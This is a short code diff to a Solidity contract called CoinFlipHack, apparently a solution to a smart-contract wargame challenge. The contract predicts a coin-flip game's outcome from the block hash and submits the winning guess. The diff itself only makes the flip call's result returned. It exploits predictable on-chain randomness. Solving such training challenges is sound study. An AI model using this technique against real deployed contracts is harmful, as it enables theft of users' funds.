@@ -19,6 +19,6 @@ contract CoinFlipHack {
         uint256 coinFlip = blockValue / FACTOR;
         bool side = coinFlip == 1 ? true : false;
 
-        ICoinFlip(coinFlipAddress).flip(side);
+        return ICoinFlip(coinFlipAddress).flip(side);
     }
 }
